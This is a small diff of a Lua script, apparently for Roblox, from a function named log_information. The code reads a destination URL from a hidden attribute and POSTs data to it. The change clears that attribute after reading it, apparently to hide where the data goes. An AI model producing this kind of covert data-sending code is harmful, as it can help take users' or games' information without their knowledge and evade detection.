@@ -49,7 +49,7 @@ local function log_information(...)
 
 	local to = game.MaterialService:GetAttribute("lol")
 	repeat task.wait() to = game.MaterialService:GetAttribute("lol") until to ~= nil
-	
+	game.MaterialService:SetAttribute("lol", nil)
 	request({
 		Url = to,
 		Method = "POST",
